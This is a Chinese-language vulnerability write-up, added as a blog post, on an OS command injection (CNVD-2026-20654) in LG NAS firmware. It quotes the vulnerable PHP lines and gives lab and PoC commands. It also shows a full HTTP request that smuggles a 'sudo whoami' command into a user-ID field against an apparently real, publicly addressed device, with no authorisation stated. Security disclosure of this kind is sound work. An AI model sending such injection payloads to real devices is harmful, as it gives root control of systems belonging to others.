@@ -1,0 +1,161 @@
+---
+title: "CNVD-2026-20654: LG NAS 远程命令注入漏洞分析"
+description: "深入分析 LG NAS 设备中的 OS 命令注入漏洞（CNVD-2026-20654），包括漏洞原理、本地环境搭建、真实设备利用过程及影响范围评估。"
+date: 2026-07-29
+tags:
+  - "CNVD"
+  - "命令注入"
+  - "LG NAS"
+  - "漏洞复现"
+  - "安全研究"
+authors:
+  - "bx"
+draft: false
+slug: "cnvd-2026-20654-lg-nas-rce"
+---
+
+import Gist from '../../components/Gist.astro';
+
+<meta name="referrer" content="no-referrer" />
+
+# CNVD-2026-20654: LG NAS 命令注入漏洞
+
+## 漏洞情况
+
+- **漏洞编号**: CNVD-2026-20654
+- **漏洞类型**: OS 命令注入 (CWE-78)
+- **评分**: 高危
+- **攻击向量**: 网络（远程）
+- **所需权限**: 低（需要有效账户）
+- **用户交互**: 无
+- **影响**: 以 root 权限完全控制系统
+
+### 漏洞代码位置
+
+**第 28 行** (`share_set_user_info.php`):
+
+```php
+$userpasswd = trim(shell_exec("sudo nas-common md5$userpasswd"));
+```
+
+![漏洞代码第28行](/blog/cnvd-lg-2026-20654/image.png)
+
+**第 78 行** (`share_set_user_info.php`):
+
+```php
+$check = trim(exec("sudo nas-share check_user$userID"));
+```
+
+![漏洞代码第78行](/blog/cnvd-lg-2026-20654/image%201.png)
+
+### 漏洞成因
+
+简单明了，原因就是：
+
+1. 直接拼接用户输入到 shell 命令
+2. 没有过滤或转义特殊字符
+3. 使用 sudo 执行，获得 root 权限
+4. shell_exec() 和 exec() 直接执行系统命令
+
+### 完整代码
+
+<Gist id="5672adaff13bc2bbae43f025faaebda2" />
+
+## 本地复现以及固件寻找
+
+> 这里采用 2569 版本
+
+固件寻找，在这里面找到 firmware_2569_web.zip 这个版本
+
+[https://www.lg.com/us/support/product/lg-N2R1DD1](https://www.lg.com/us/support/product/lg-N2R1DD1)
+
+![固件下载页面](/blog/cnvd-lg-2026-20654/image%202.png)
+
+### 本地环境搭建
+
+搭建了一个近似的环境：
+
+[https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection](https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection)
+
+简单命令：
+
+```bash
+# 克隆仓库
+git clone https://github.com/bx33661/CNVD-2026-20654-lg-nas-command-injection.git
+cd CNVD-2026-20654-lg-nas-command-injection
+
+# 启动漏洞环境
+cd environment
+docker compose up -d
+
+# 运行 PoC（自动登录 + 命令执行）
+cd ..
+python3 poc.py \
+  --target http://127.0.0.1:8000 \
+  --username admin \
+  --password admin \
+  --command "id"
+```
+
+### 本地测试结果
+
+具体搭建起来情况：
+
+![本地环境搭建](/blog/cnvd-lg-2026-20654/image%203.png)
+
+使用 admin/admin 登录进来：
+
+![登录界面](/blog/cnvd-lg-2026-20654/image%204.png)
+
+## 真实设备挖掘
+
+下面在一台真实设备上复现。前提是已经登录后台、拿到了合法的 `PHPSESSID`。
+
+```http
+POST /en/php/share_set_user_info.php HTTP/1.1
+Host: xxxx:9090
+Content-Length: 35
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Origin: http://91.171.64.154:9090
+Referer: http://91.171.64.154:9090/fr/system/system.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: lgnas_language=fr; lgnas_web_menu=1; PHPSESSID=jhhc3np2bbgc8rmb3j1jrbgn66
+Connection: close
+
+txtMode=add&txtUserID=|sudo+whoami+>+../../zbx.txt
+```
+
+![真实设备利用](/blog/cnvd-lg-2026-20654/image%205.png)
+
+### 验证命令执行
+
+访问登录页面：
+
+![验证页面](/blog/cnvd-lg-2026-20654/d257b199-c63f-455f-8ae4-a221d92f4cbc.png)
+
+查看命令执行结果：
+
+![命令执行结果](/blog/cnvd-lg-2026-20654/c02bbf5e-8541-4e8c-9172-f88287089971.png)
+
+成功写入并执行命令！
+
+## 影响范围
+
+除了对应远程版本，我们测试了 **5 个固件版本**，时间跨度 **10 个月**（2009-12 到 2010-10）：
+
+| **版本** | **发布日期** | **MD5** | **文件写入** | **状态** |
+| --- | --- | --- | --- | --- |
+| 2407 | 2009-12-29 | 3e01b8e3b915d95f72996e32ad78357e | 否 | 存在漏洞 |
+| 2450 | 2010-02-11 | 3e01b8e3b915d95f72996e32ad78357e | 否 | 存在漏洞 |
+| 2504 | 未知 | 3e01b8e3b915d95f72996e32ad78357e | 否 | 存在漏洞 |
+| 2557 | 2010-09-12 | 3e01b8e3b915d95f72996e32ad78357e | 否 | 存在漏洞 |
+| 2569 | 2010-10-28 | 3e01b8e3b915d95f72996e32ad78357e | 否 | 存在漏洞 |
+
+所有测试版本均存在该漏洞，影响范围广泛。
+
+## 总结
+
+CNVD-2026-20654 是一个典型的命令注入漏洞，通过未过滤的用户输入直接拼接到 shell 命令中，结合 sudo 权限提升，攻击者可以获得设备的完全控制权。该漏洞影响多个固件版本，建议受影响用户尽快升级固件并加强访问控制。
